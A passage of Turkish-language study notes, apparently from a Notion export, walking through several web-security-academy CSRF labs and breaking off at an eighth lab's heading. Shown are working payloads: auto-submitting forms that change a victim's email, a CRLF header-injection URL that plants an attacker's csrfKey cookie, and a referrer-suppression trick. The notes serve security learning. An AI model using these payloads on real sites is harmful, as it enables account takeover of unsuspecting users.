</p><h3 id="6815bc47-a609-4bc1-b953-45aadfdaaa70" class=""><mark class="highlight-teal">csrf değerini değiştir yolla , istek reject edilecek mi , kontrol et !</mark></h3><p id="7a148fa3-2797-4eec-9553-c67de847bcfb" class="">
</p><p id="65634889-f22d-4b63-8bd8-3dc901be313f" class="">Evet csrf değerini değiştirince , değerler uyuşmadığı için http isteği reject edildi.</p><p id="cc9200a0-2501-4ead-81e3-e8bca3db42ad" class="">
</p><h3 id="d4b7df93-0287-4187-89fa-73c63129ef70" class=""><mark class="highlight-teal">csrf parametresini kaldır , istek reject edilecek mi , kontrol et !</mark></h3><p id="d2102318-48d3-48a0-b03e-7db2e1f50158" class="">
</p><p id="e58b54b2-a854-49f4-8cce-601d4e0f4b02" class=""><mark class="highlight-orange">csrf parametresini kaldırdım ve istek reject edilmedi  , istek kabul edildi şaka gibi ama gerçek.Bu gibi durumlar yazılımcıların backend’de yaptıkları </mark><strong><mark class="highlight-red">güvensiz editlemeler</mark></strong><mark class="highlight-orange"> sonucunda yaşanan olaylar.</mark>
</p><p id="32924e45-e3a7-4be6-832d-85c18fe058a1" class="">

</p><h2 id="253fb0f6-636d-4ca8-a1c7-e26f0b45157c" class="">Bu bağlamdaki payload ;</h2><pre id="5627e000-e722-46aa-865e-65ce5635480a" class="code"><code>&lt;form action=&quot;https://domain.com/my-account/change-email&quot; method=&quot;POST&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;amigo@normal-user.net&quot;&gt;
&lt;/form&gt;

&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;</code></pre><p id="5e61e0b3-1d52-4b15-b7ee-baec6c8fe4fe" class="">
</p><p id="2cf777c1-596f-4b6e-b820-4aab147c7fed" class="">
</p><p id="de90941c-e09f-4ae8-b745-6cee38d3c836" class="">########################################################################</p><p id="e46a2f59-390f-4194-ac00-0d107495fb6f" class="">########################################################################</p><p id="f176e7a7-fa86-4506-96f7-203db5fac620" class="">########################################################################</p><p id="e79b39a0-158e-433b-95f5-40fab7e1c370" class="">
</p><p id="c71c9692-fe7e-43cf-95c5-21bf68623864" class="">
</p><h1 id="ad0c500c-f5da-4fc3-92a7-8bb3e332438e" class=""><mark class="highlight-purple">4.) CSRF where token is not tied to user session</mark></h1><p id="dc5b14ad-7e2e-4c70-a305-d77ce89b559d" class="">
</p><p id="e67a97cb-9703-4ce9-964e-9cf09e2ce666" class="">(Kullanıcının sessionuna bağlı olmayan csrf token değeri )</p><p id="2c5a1787-f016-4ed8-8e92-7ff6d732649c" class="">
</p><h2 id="f505d9c5-5dab-429d-a3b2-6a94d89c971b" class=""><mark class="highlight-teal">Yani kurbanın session&#x27;undan , hacker&#x27;ın csrf tokenı ile kurbana bir http isteği yaptırıyorsun.</mark></h2><p id="98bc2d48-b493-4886-a30d-7965a97afdb2" class="">
</p><h3 id="57343f0d-1c7f-4f0d-ba92-3d2d31b58265" class=""><mark class="highlight-teal">Buradaki zafiyet csrf değeri ile session uyumu kontrolü yapılmadığı için.</mark></h3><p id="7bc5e1f6-42cc-43a3-8294-707a394db103" class="">
</p><p id="0b68decc-cf90-4cd2-8872-ab463442cfbf" class=""><strong><mark class="highlight-teal">Bu token&#x27;ın sahibi ,  bu session mu ( session cookie  ) doğrulanması gerekiyordu.</mark></strong></p><p id="c0cf58c6-c795-410e-b0f8-8de041f48238" class="">
</p><h3 id="52c33fb8-ebc0-4b0d-a4fc-b74498311fa3" class="">wiener (kurban)</h3><pre id="793c24a1-b780-4ffa-8729-3898ca78217b" class="code"><code>&lt;form class=&quot;login-form&quot; name=&quot;change-email-form&quot; 
action=&quot;/my-account/change-email&quot; method=&quot;POST&quot;&gt;


&lt;label&gt;Email&lt;/label&gt;


&lt;input required type=&quot;email&quot; name=&quot;email&quot; value=&quot;&quot;&gt;


&lt;input required type=&quot;hidden&quot; name=&quot;csrf&quot; 
       value=&quot;jx5eP1CxL7P9HQNW1ok5ht7LACL4APMg&quot;&gt;


&lt;button class=&#x27;button&#x27; type=&#x27;submit&#x27;&gt; Update email &lt;/button&gt;


&lt;/form&gt;</code></pre><p id="710d4a37-5b6e-424d-b07f-a4f20f984036" class="">
</p><p id="762b21ce-fce1-4821-97c7-4956e320629d" class="">
</p><p id="0aafe6f6-03ae-4968-8041-11adb020d2e1" class="">
</p><p id="8ae28f52-a44f-4962-8e7f-e84da7bb7b8d" class="">
</p><p id="3bd546ba-3d31-4094-a6a1-f2dfeefc3dbf" class="">
</p><h3 id="ea8397be-cc3e-4851-9990-469cc8ceeda1" class="">carlos(çakal carlos ,  the attacker)</h3><pre id="ee456cb8-65b4-44aa-8efa-e11c342a2180" class="code"><code>&lt;form class=&quot;login-form&quot; name=&quot;change-email-form&quot; 
action=&quot;/my-account/change-email&quot; method=&quot;POST&quot;&gt;
                            
&lt;label&gt;Email&lt;/label&gt;
                            
&lt;input required type=&quot;email&quot; name=&quot;email&quot; value=&quot;&quot;&gt;
                            
&lt;input required type=&quot;hidden&quot; name=&quot;csrf&quot; 
value=&quot;vmqiGcR6DgOXKkfHEZo5viM35elT9lv7&quot;&gt;
                            
&lt;button class=&#x27;button&#x27; type=&#x27;submit&#x27;&gt; Update email &lt;/button&gt;
                        
&lt;/form&gt;</code></pre><p id="7b26413a-7cc8-45df-9de8-dfdf77b4ef6c" class="">
</p><p id="c8c60676-25de-4cf4-835b-f84a1798d0f6" class="">Yine aynı şekilde her login olduğunda farklı bir değer atanan csrf değeri , csrf token mekanizması var.</p><p id="c88e3f71-fbe0-4049-951e-26ecaa606147" class="">
</p><p id="5081f5b0-b937-49e9-9a11-54bba61f1052" class=""><code>CSRF token değerini diğer hesaptaki değerle değiştirirseniz, isteğin kabul edildiğini gözlemleyin yeni wiener&#x27;in csrf token değeri yerine carlos&#x27;un csrf token değerini koy ve isteği yap response 200 OK mi kontrol et.</code></p><p id="4132fcdb-ec60-47f0-b6c2-0709c485af49" class="">
</p><p id="6fdd108d-c8e0-4746-a82d-fa90723454ed" class="">
</p><p id="6b555398-0ed0-4883-b7a7-c193356e3566" class="">
</p><p id="f02a1404-fc81-4a97-ab11-216cd79bf3bd" class="">
</p><p id="d224c57d-b270-4ee6-8ce2-e545907a648f" class="">Yapılan işlemler ;

</p><p id="662411d9-c216-4038-98be-a280232a31d3" class="">wiener kullanıcı iken ;
change email sayfasında &quot;update email&quot; yaptık bu isteğin arasına girip csrf token değerini aldık.</p><p id="3a07ecdc-e362-42e0-a675-0b9bda8d7bcc" class="">
</p><p id="9a36f649-8443-4886-b14d-27d4e5c336d0" class="">carlos kullanıcısı iken ;
exploit server a gittik ve aşağıdaki payloadı store edip , deliver ettik.</p><p id="23ba0281-8e94-43a4-80d8-6233bd03e6ed" class="">
</p><p id="b439cf09-4d88-4a88-93e7-85f65c86b15b" class="">( Ben tersten yaptım , carlos&#x27;un tokenı ile wiener&#x27;de istek yapan payloadı wiener&#x27;ın exploit server&#x27;ına eklene de bilirdi )</p><p id="c1e96be7-361b-4bde-947b-92a836408f97" class="">
</p><p id="338ee719-2351-493b-a609-a6757a49dc59" class="">Payload ;</p><pre id="3afb95c8-a4eb-4afa-96e6-6b024de14e13" class="code"><code>&lt;form 
action=&quot;https://wiener_in_domain/my-account/change-email&quot; method=&quot;POST&quot;&gt;
                            
                            
&lt;input  type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hadiiiiiiiiiiiii@gmail.com&quot;&gt;
                            
&lt;input  type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;wiener_in_csrf_token&quot;&gt;
                                                   
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;</code></pre><p id="e96d51ca-d150-41b5-b354-e5b8b6408f60" class="">
</p><p id="2ee13afd-90f4-4692-b385-a0c3509ebcd7" class="">
</p><p id="90924667-4433-4ca2-9328-55e788e7c6d2" class="">########################################################################</p><p id="f9ac3c47-8065-4af1-8ce8-dd9b00bd35b5" class="">########################################################################</p><p id="3240f41e-ef22-40e9-8fed-c4d8cdca71bc" class="">########################################################################</p><p id="9b5279ee-dfa1-47d2-b81e-8c7be01f026b" class="">
</p><p id="da6df35b-f81f-42c3-8b10-9b24c97246dd" class="">
</p><h1 id="f6ea5a89-cd6c-4260-8655-7250ff0d827c" class=""><mark class="highlight-purple">5.) CSRF where token is tied to non-session cookie</mark></h1><p id="ba48a22d-03d8-44d3-ab02-fa9e5c32d64e" class="">
</p><p id="9d956765-d528-4044-a5cd-138decf866cb" class="">
</p><h3 id="d48bc5bf-b6a3-45bc-95a8-b1ed08373aae" class="">
Zafiyetin Özeti :</h3><p id="80481ba2-029f-4aba-9a79-046ef3d608f7" class="">
</p><p id="f7d64663-a6a3-43cc-93f7-405b7ef4fb03" class="">wiener&#x27;in session&#x27;undan   ,   carlos&#x27;un csrfKey ve csrf tokenlarını kullanarak yaptığın bu istekte eğer mail adresinin değiştiğini gözlemliyorsan ;
CSRF where token is tied to non-session cookie zafiyeti vardır.</p><p id="d105f096-22de-4895-8c33-ab7bf012cd8e" class="">
</p><p id="d9ff9ddd-fc71-4914-a17d-984f0434aa03" class="">
</p><h3 id="a742d479-51f4-437a-a255-bb6dd5654c6b" class="">Gözlemler ;</h3><p id="ae8bd58a-a4fc-465f-8647-0dc635c7910d" class="">
</p><ul id="75df78b9-4fcf-4a6f-a1d2-d98f480b06fb" class="bulleted-list"><li style="list-style-type:disc"><strong><mark class="highlight-orange">csrfKey</mark></strong> ve<strong><mark class="highlight-orange"> csrf</mark></strong> token birbirine<mark class="highlight-teal"> </mark><mark class="highlight-teal"><strong>bağlı.</strong></mark></li></ul><p id="352e7918-ae11-4174-9f1c-5fc1693060b3" class="">           (wiener&#x27;in session&#x27;undayken carlos&#x27;un csrf tokenını girip isteği yolladığında &quot;Invalid CSRF                       </p><p id="e9371fa4-1399-4fb4-a552-3efaeec0fe71" class="">             token&quot; alıyorsun.)</p><p id="40ca24b2-eba1-4314-ae60-f7565cadf98d" class="">            Yani <strong><mark class="highlight-yellow">csrfKey</mark></strong> ve <strong><mark class="highlight-yellow">csrf</mark></strong> uyumsuzluğunda http request&#x27;i reject ediliyor.</p><p id="fac83b5d-8259-4a71-87c8-e981b15f4df7" class="">
</p><ul id="ed51f04d-5ae1-4da5-88a4-658e1c1e772c" class="bulleted-list"><li style="list-style-type:disc">Ama <strong><mark class="highlight-purple">csrfKey</mark></strong> ve <strong><mark class="highlight-purple">csrf</mark></strong> token , <strong><mark class="highlight-purple">session</mark></strong>&#x27;a <mark class="highlight-red"><strong>bağlı değil.</strong></mark></li></ul><p id="322c55cb-32a6-4e0e-b1d6-2175685256ec" class="">
</p><p id="7467b14e-c4e3-4801-a0e0-d1ff51667219" class="">
</p><ul id="d24ce2e2-b6b7-4ee8-abad-ff3650a0af12" class="bulleted-list"><li style="list-style-type:disc">csrfKey ve csrf tokenını kullanarak authenticated request yapıyorsun ( CSRF zafiyeti )</li></ul><p id="3d7a9693-865f-44ec-b8d5-85868588b90d" class="">
</p><p id="96c9273d-3c94-485a-93a8-f19026938a1f" class="">
</p><p id="bd835af9-ff78-4858-9173-3a42e4c2797e" class="">
</p><p id="7ba24de2-6eaa-44f0-adfa-3ee52f6ce93d" class="">
</p><h3 id="e6754c7f-39f4-4dc9-b7b1-bd64756a0314" class="">Manuel Test ( Manuel Exploitation )</h3><p id="ebf202c9-97ae-4cc9-aa0f-c81770d352f5" class="">wiener&#x27;in session&#x27;undan   ,   carlos&#x27;un csrfKey ve csrf tokenlarını kullanarak yaptığın bu istekte eğer mail adresinin değiştiğini gözlemliyorsan ;
CSRF where token is tied to non-session cookie zafiyeti vardır.</p><p id="2db16840-ab27-48ed-993c-3836c170400e" class="">
</p><p id="36778ff2-b2c0-4f4c-8561-edf1d935af62" class="">wiener(kurban) kullanıcısı iken email change submit et , bu isteği repeater a yolla.</p><p id="0e319fba-5b6a-4612-b4a5-020b46a75f5a" class=""><mark class="highlight-orange">Repeater&#x27;da bulunan</mark> <strong><mark class="highlight-teal">csrfKey cookie</mark></strong> ve <strong><mark class="highlight-teal">csrf token</mark></strong> <mark class="highlight-orange">parametreleri yerine carlos&#x27;un (attacker)  değerlerini yapıştır ve isteği yolla.</mark></p><p id="80f04fb5-1254-4856-a6d4-c3c57e74ccaa" class="">
</p><p id="dae57a8a-6737-490c-bc22-57a687e051d6" class="">
</p><p id="de8ebd0a-65c8-4721-8bb6-20fe994f9754" class="">
</p><p id="1efc7532-3cc7-4be5-9ccd-4bf290d1c065" class="">
</p><p id="081f5a2e-bcee-4ee3-96bb-c488f11d4db7" class="">
</p><h3 id="2f1ae6dd-78f5-443e-af19-1259ffe69e5c" class="">Kurban ve Saldırganın Perspektifinden ;</h3><p id="23f06835-56ae-46c8-949f-be8b0ba9bea1" class="">
</p><p id="c726cacd-3752-42a5-ae6f-c8f5d1c6b246" class="">kurban      :    wiener</p><p id="3c2a61bb-9478-4849-87f2-565d53674e38" class="">saldırgan  :    carlos</p><p id="b4354126-3f00-4f58-92c0-dba379223df3" class="">
</p><p id="0f4bf305-8687-4b55-9b91-152b0ce23fc3" class="">
</p><p id="c1ea2e6d-0ed1-4940-8f0e-240de097a838" class="">Bir site var , bu sitede kurban ve saldırgan olarak iki kişi barınmakta , hem kurban hemde saldırgan bu sitede hesapları var.</p><p id="1ad425bd-43de-4bc7-a954-552053d6ea7b" class="">
</p><p id="a7f4f219-9dd3-43ea-958c-1136ef0e5393" class="">
</p><p id="4273365e-bd33-450c-96ff-fb66f2f28877" class="">
</p><p id="f405ce0c-cca6-4c9c-a7fd-9148ab4bb526" class="">Kurban öyle bir siteye gidiyor ki ;</p><p id="e977167d-adb2-4ebe-ad80-b37904f30ba8" class="">kurban kendi sessionundayken  , saldırganın csrfKey cookiesini ve csrf tokenını kullanarak otomatik olarak &quot;email changing&quot; yapan  bir html formu&#x27;nu çalıştırıyor ama farkında değil tabi , o sadece blabla.html&#x27;ye gitmişti ama serverda bulunan bu zararlı html dosyasının içindeki form&#x27;da bulunan http isteklerinin neler yaptığından bi haber.</p><p id="75fca9f3-8d04-435e-9969-29900a90d9e9" class="">
</p><p id="e10773a7-28af-4dd2-a578-e5e26dc3bd7c" class="">
</p><p id="9cd12c10-6c6c-4874-860f-a20bff2a1ac4" class="">
</p><p id="a7df93ea-8ecb-40bd-96d6-72bfb4d4288d" class="">Saldırgan öyle bir payload hazırlıyor ki ;</p><p id="f8aaf295-3df9-472f-8f8c-118c067707dc" class=""> javascript ile saldırganın <mark class="highlight-teal">csrfKey cookie</mark>si ve <mark class="highlight-teal">csrf tokenı dinamik olarak eklenecek</mark> bu işlemi yapan bir html form PoC&#x27;si hazırlaman lazım daha sonra bunu server a upload etmen lazım.</p><p id="5484934a-350c-4c10-a77e-9697888225cb" class="">
</p><p id="f75ed25e-7498-4ea8-a233-6137096caf41" class="">
</p><p id="2eaa51c3-be05-4ef8-9141-c6458ef825d2" class="">csrfKey ve csrf değerlerinin nasıl ekleneceği analizi ;</p><p id="ad2b096a-3c28-4ec9-ba8b-df0e61f6c92e" class="">
</p><p id="bdce0b1b-d625-4a7a-8dae-3eed296cd282" class=""><strong><mark class="highlight-teal">csrf</mark></strong> değerini gönderme işi daha öncede yaptığımız gibi ,  kolay ;</p><p id="2e326be8-92ea-4a63-ba72-39015fda1a18" class=""><mark class="highlight-yellow">&lt;input type=hidden name=</mark><mark class="highlight-teal">csrf</mark><mark class="highlight-yellow"> value=</mark><mark class="highlight-yellow"><strong>csrf_token_of_carlos</strong></mark><mark class="highlight-yellow">&gt;</mark></p><p id="4928c73d-657f-48bb-a5d6-ce582ce9e129" class="">
</p><p id="4c39ce3f-2476-493b-9525-e4a36bd3aca8" class="">
</p><p id="d2ce7a12-7b7f-4d1f-a3d7-14f7b2da5304" class="">
</p><p id="8a8a3ff0-591f-46a1-8f95-d455f5e4bb30" class="">
</p><p id="948d1bc7-e59f-43ac-98e5-fd672e9a2ff1" class="">
</p><p id="4fbc8fd6-a9c2-4386-b3ec-18e1d4aab652" class="">Fakat , Cookie : header&#x27;ında bulunan <mark class="highlight-teal">csrfKey</mark> değerini requestte göndermek için aynı şeyi söyleyemem.</p><p id="a3000f93-3a51-48e5-bec5-a37944581b01" class="">
</p><p id="b4fb4c19-095f-4c88-bfe6-1d9ade68e2bf" class="">Bunun için site&#x27;de cookie ekleyen requestlere focuslanman lazım !</p><p id="6eb9cc6f-ae23-43b4-b84b-3e812acb246b" class="">
</p><p id="b3846dca-4f51-4fa7-8d94-19e8a56d727c" class="">Bu challenge&#x27;da ?search parametresi ile giden istekler cookie olarak ekleniyor !</p><p id="cd0c80fd-d595-412b-8095-aa580596374d" class="">
</p><pre id="aff36478-5f01-4ca3-8c6a-8c05efb8da27" class="code"><code>https://wiener_domain/?search=test%0d%0aSet-Cookie:%20csrfKey=csrfKey_of_carlos



        
%0A    =&gt;    Line Feed
%0D    =&gt;    Carriage Return           
%20    =&gt;    Space       


Yukarıdaki http isteğinin url decoded hali :

https://wiener_domain/?search=test
Set-Cookie: csrfKey=csrfKey_of_carlos</code></pre><p id="c8d2df7a-f173-48fa-986c-fb16678cf399" class="">
</p><p id="b6a43b6f-7602-4a67-afe2-5da9090406d8" class="">
</p><h3 id="3c1460a5-788e-4064-aa8c-63af24ba960e" class=""><mark class="highlight-orange">csrfKey</mark> ekleme yöntemi  <mark class="highlight-yellow">(HTTP Header Injection)</mark> ;</h3><pre id="d84390ac-7318-4abb-a1d3-f8cfd7675f54" class="code"><code>&lt;img 

src=&quot;https://wiener_domain/?search=test%0d%0aSet-Cookie:%20csrfKey=csrfKey_of_carlos&quot; 

onerror=&quot;document.forms[0].submit()&quot;
&gt;</code></pre><p id="87b3ae79-32eb-481d-812c-10beba8c4b10" class="">
</p><p id="63ff7487-974d-4e85-821e-978dc5525a21" class="">
</p><p id="1587d31a-049e-44d8-8420-ae1a21789ced" class="">
</p><h3 id="723bfe3e-601d-434e-a28f-ebb632b2a739" class="">Payload :</h3><pre id="ab272911-59b8-42c0-8568-2d163e37f3b5" class="code"><code>&lt;form  action=&quot;https://wiener_domain/my-account/change-email&quot; method=&quot;POST&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacked@hacked&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=csrf_token_of_carlos&gt;
&lt;img src=&quot;https://wiener_domain/?search=test%0d%0aSet-Cookie:%20csrfKey=csrfKey_of_carlos&quot; onerror=&quot;document.forms[0].submit()&quot;&gt;
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;</code></pre><p id="00bcc51b-69c0-4b81-b4ca-df9b4f868efd" class="">
</p><p id="3bd7cdce-9934-45e7-99e1-2cb219f1b159" class="">
</p><p id="4a56f9ca-d745-41bb-9812-3c0bb1105038" class="">
</p><p id="e3a797fe-aeeb-4c47-8a49-efe94bb80806" class="">########################################################################</p><p id="cf4c02d4-eab4-4fc5-b442-ed64d827af22" class="">########################################################################</p><p id="837b4d4e-ac75-42d8-9a24-c1b9fe6f3581" class="">########################################################################</p><p id="d656515c-1b4e-4d83-9700-b5be191776a6" class="">
</p><p id="18a88240-9253-412c-9fd3-de8850fa8788" class="">
</p><p id="895879c8-11c9-44ba-b9ec-f4b53a8fc430" class="">
</p><h1 id="0a80ceb8-34c7-483f-8567-9d43cae6139f" class=""><mark class="highlight-purple">6 .) Lab: CSRF where token is duplicated in cookie</mark></h1><p id="8a6ce9c7-db7d-46f0-8adc-8af1f261599c" class="">
</p><p id="5d101e15-4636-4bd2-b0e2-e36517a7e7ca" class="">
</p><p id="7d36cbeb-0006-4ace-80a3-bc46295b8481" class="">
</p><figure id="8e833dbc-be9f-47ea-95f9-968d88de3c46" class="image"><a href="CSRF%208e833dbcbe9f47ea95f9968d88de3c46/Screen_Shot_2021-12-04_at_19.17.27.png"><img style="width:1215px" src="CSRF%208e833dbcbe9f47ea95f9968d88de3c46/Screen_Shot_2021-12-04_at_19.17.27.png"/></a></figure><h3 id="21b32abe-5e24-458d-b4df-a2c06bcc4deb" class=""><mark class="highlight-teal">Bu challenge&#x27;taki doğrulama işlemi , Cookie header&#x27;ında bulunan csrf değeri ile , post datasıyla giden csrf parametresinin match olma işlemi ile gerçekleşir.</mark></h3><p id="28da68ad-0e38-4aba-a54c-3b76a378e625" class="">
</p><p id="c180707e-15f8-426a-a547-4702b31704a4" class="">Yani ;</p><pre id="d6fa54ee-3180-4f34-b02f-3a977b91e760" class="code"><code>Cookie: csrf=kxxquo08TmyajpOd0wbpNBh2zvvhFLex;

email=aaaaaa%40aa&amp;csrf=kxxquo08TmyajpOd0wbpNBh2zvvhFLex


Yukarıdaki durumda da request kabul edilir , aşağındakinde de .


Cookie: csrf= test;

email=aaaaaa%40aa&amp;csrf=test


</code></pre><p id="2a103acd-799f-4e2e-8617-3282d98bb5b2" class="">
</p><p id="9f3f8995-eb0c-4e34-b07a-7889e311ed71" class="">
</p><p id="7e75858f-4a80-4501-9e30-4aa223a926ee" class="">
</p><h3 id="5d80de10-5cb4-4133-bad3-843afc99091a" class="">Bu bağlamdaki payload :</h3><pre id="6ca089b5-fa58-451a-bf8a-73e136358d7f" class="code"><code>&lt;form action=&quot;https://main_domain/my-account/change-email&quot; method=&quot;POST&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacked_mail@tr&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;fake&quot;&gt;
&lt;img src=&quot;https://main_domain/?search=test%0d%0aSet-Cookie:%20csrf=fake&quot; onerror=&quot;document.forms[0].submit()&quot; &gt;
&lt;/form&gt;</code></pre><p id="c8535d4c-0e5a-4cbd-a1f4-f997da0647f6" class="">
</p><p id="b031cc6c-7311-4fcb-a966-bcfeb2d296b9" class="">
</p><p id="435a9ef6-af94-4cfa-916b-2a8ae68f0125" class="">
</p><p id="c194214a-0ba3-4753-baa4-72b196d5e000" class="">########################################################################</p><p id="48fa9e0c-eacd-4fee-8636-03e1512c3703" class="">########################################################################</p><p id="8e62ba1c-f627-4929-ad38-3cb040554815" class="">########################################################################</p><p id="131d0a82-c63f-4c0a-9d4a-acd1aca8429f" class="">
</p><p id="33443b0a-321e-4aa0-9e74-3482ce3931b4" class="">
</p><h1 id="41b177d2-3da3-459c-982f-9621d33d92f6" class=""><mark class="highlight-purple">7.). CSRF where Referer validation depends on header being present</mark></h1><p id="09af2ca7-5e69-49f6-86cb-a189301128e8" class="">
</p><p id="d87b746c-7ce5-4095-b16e-09bb02b0d124" class="">
</p><h3 id="1413e3e9-a104-4898-bf85-2bafc7b94459" class="">Refferal header nedir ?</h3><p id="25c418d5-e182-44b1-933a-f1bdd1ab00a7" class="">Refferal header ;  http requesti yapan site&#x27;nin URL&#x27;ini içeren isteğe bağlı bir request header&#x27;dır.</p><p id="7f17bff8-f51f-48e5-b3bb-4d5d2f8c7b30" class="">Refferal header , isteğin nereden geldiğini belirler, bu nedenle bazı uygulamalar, isteğin orijinal web sitesinden kaynaklandığından emin olmak için , CSRF saldırılarına karşı savunma girişiminde bulunmak için bu yönlendirici başlığını kullanır.</p><p id="f8b3ba58-4883-4938-a2a1-ef1b35f2d5cc" class="">Bu yüzden buradaki isteğin randomnumber.websecurityacademy.net olan web sitesinin domain&#x27;inden gelmesini sağlarlar ve başka bir domainden gelirse reddedilir..</p><p id="630d0a0a-4105-4cc6-9190-8cd55a9eab63" class="">
</p><p id="7867e7e9-2391-43f0-9eaf-ef30da650ae8" class="">
</p><p id="2f9504be-6889-4aa5-bf03-2a366a8ad522" class="">Bu challenge&#x27;da refferal header değeri ana domain header değeri ile aynı.</p><p id="772ccb74-1e7e-4931-979d-1511a910c82c" class="">referer header = exact (main) domain header</p><p id="387ceb6d-34ca-4f42-9e4c-275a208beb82" class="">
</p><p id="528618df-68c6-4ad1-9ac9-f47a1dc45e9c" class="">Ama bu genelde csrf için güzel bir koruma yöntemi değildir çünkü refferal header spoofed edilebilir , uygulaması zordur ama mümkündür.</p><p id="ed711695-6ea1-4181-a96a-71fad74c3ed8" class="">
</p><p id="66dff846-d05e-4b90-bfd8-c71ffa1511fb" class="">Şimdi bu durumda, Refferal header&#x27;ını spoof (taklit) etmeye çalışmayacağız, bunun yerine bunun backend&#x27;de nasıl uygulandığını exploit edeceğiz , böylece backend&#x27;de uygulanan Refferal header&#x27;ı kontrol edeceğiz.</p><p id="a1c4aa6d-31e5-499a-9b02-aa43332196d1" class="">
</p><p id="c75867a2-24f7-40aa-9eee-3c805c82040e" class="">
</p><p id="5e4ab209-b19f-4cc8-ba86-ae512c2f886b" class="">
</p><p id="4e1b1d55-c83d-4c49-9e91-cfb9c04d0ada" class="">Referer headerı CSRF ataklarına karşı test edelim ;</p><p id="9778cc6a-e21f-4d04-b8cf-a75c1244da40" class="">1.) referer header ı kaldıralım</p><p id="0b85ddb1-882a-401e-aeb4-0242d4a37319" class="">
</p><p id="dc61abeb-0de8-4263-8c0e-a4c29b205e9c" class="">Referer header varsa kontrol sağlanıyor ama  refrer header yoksa kontorlü sağlanacak bir şeyde olmaz ve request accept edilir. Bu labdaki backend’deki durum bu.</p><p id="1bc3d593-72ed-4def-97a7-423dfae0ff06" class="">
</p><p id="2b03b4af-cb61-4fc2-bc8b-c21bee3f17db" class="">
</p><p id="952c4d76-ef0e-4784-9f50-37f5febc3ade" class="">
</p><h3 id="7e4c8b69-c605-408e-871e-c705e4e56153" class="">Bu, CSRF&#x27;e karşı kesinlikle savunmasızdır, çünkü Referer header&#x27;ı kontrol eden yönlendiren savunma mekanizması düzgün bir şekilde uygulanmamıştır.</h3><p id="e0fba3a6-e85e-42f9-8170-2830ac5b1e76" class="">
</p><p id="d0c62674-6f4e-4838-b32c-5cffe0f6edb1" class="">
</p><p id="d5ecb768-b7eb-4fa6-96d4-66e679361361" class="">
</p><p id="d57be16d-0773-4342-a48c-a53f2bf1b999" class="">Yani yabancı kaynaklardan , external kaynaklardan  malicious request (email değiştiren request ) yapılaMAmasının nedeni Referer Header ile doğru kaynaktan mı ( web uygulamasının orjinal domaininden ) geliyor diye kontrol edilmesi durumu var , burada kontrol ediliyor ve csrf e karşı korunuyor.</p><p id="d7892d05-a9f8-46d2-8842-3a782e3e90a9" class="">Bunu bypasslamanın yolu ise hazırladığım html payload için  aşağıdaki header ı girmek ile mümkün ;</p><p id="13c38dc0-3006-4a6a-816c-63ae9685c0af" class="">
</p><p id="fbefd3c5-7b94-4fdd-80df-39b2c6432f99" class="">
</p><p id="de9a592d-f915-4c06-b460-0385517eb8e4" class="">
</p><p id="d556ba16-b671-462a-b109-603fefb09857" class="">
</p><p id="ed951d1e-ec4c-4b20-94dd-bce0dcf455a0" class="">
</p><h1 id="3b9fbb0a-6b00-4575-bcaa-763e7fcec3d8" class=""><mark class="highlight-purple">Olay şu ; </mark></h1><h3 id="5144c3ec-b08c-41b6-a18d-93b76aaeb69e" class=""><mark class="highlight-red">1.) Yani refferer header ı sil , böylece kontrol edilecek bir refferer header&#x27;da olmaz.</mark></h3><h3 id="46ce8984-e89e-411f-be26-a1a3f653447f" class=""><mark class="highlight-red">2.) Lakin </mark><mark class="highlight-blue">referrer headerı sildiğinde server sıkıntı yapmaması için</mark><mark class="highlight-red"> aşağıdaki meta datayı requeste inject edeceğiz.</mark></h3><p id="f9f75533-74e3-44a6-bc30-67a0ddd2dcd3" class="">
</p><pre id="87d7fe68-fba0-46b5-b146-9608e182c004" class="code"><code>&lt;head&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;
&lt;/head&gt;</code></pre><p id="5c6ebf68-ca2e-4996-a335-e6e7fdcc523a" class="">
</p><p id="a72b8bff-ac2b-457b-a499-7c94bb9b29f9" class="">
</p><p id="456fae22-05f8-4866-b004-9f2f85a39c74" class="">
</p><p id="fc5f1320-cd8b-42b3-8a01-fe5fd3b88500" class="">
</p><p id="38fa8352-c29a-4f91-9f43-9a6b10b481c1" class="">
</p><p id="a8bffedd-c1e3-4385-a632-e258da20dc34" class="">
</p><h3 id="21103f6d-8969-4b86-b794-229e9d544095" class="">Bu bağlamdaki payload ;</h3><pre id="1c720b2f-763d-4d41-b534-b961db3d979e" class="code"><code>&lt;head&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;
&lt;/head&gt;

&lt;form  action=&quot;https://main_domain/my-account/change-email&quot; method=&quot;POST&quot;&gt;
&lt;input  type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacked@hi&quot;&gt;
&lt;/form&gt;

&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;</code></pre><p id="742f983e-93c7-4a42-95c2-e6ec8daf1862" class="">
</p><p id="83864a5f-6c8c-491b-90ba-82327dd24bc7" class="">
</p><p id="7a19e9ed-0ca3-4e1b-a030-66b87ad2f3c9" class="">
</p><p id="c2580249-8144-475d-b90f-b9645a6c8bef" class="">########################################################################</p><p id="0aea0d65-e269-4b6c-b8c9-ade5cc319eb9" class="">########################################################################</p><p id="6996acd5-9dcc-4891-bc68-52579dbc2535" class="">########################################################################</p><p id="7dd93db9-45d4-4865-a43a-12601475450e" class="">
</p><p id="ed568696-f3ad-4044-92d0-31d3fa5b1eab" class="">
</p><h1 id="0f2965a2-faf7-4c2b-9b17-77925fff688a" class=""><mark class="highlight-purple">8.) CSRF with broken Referer validation</mark></h1><p id="6485cf55-2355-4511-9f69-f3fb14daa81a" class="">
</p><p id="bc268449-e0de-4272-8073-bd0accb55b4b" class="">
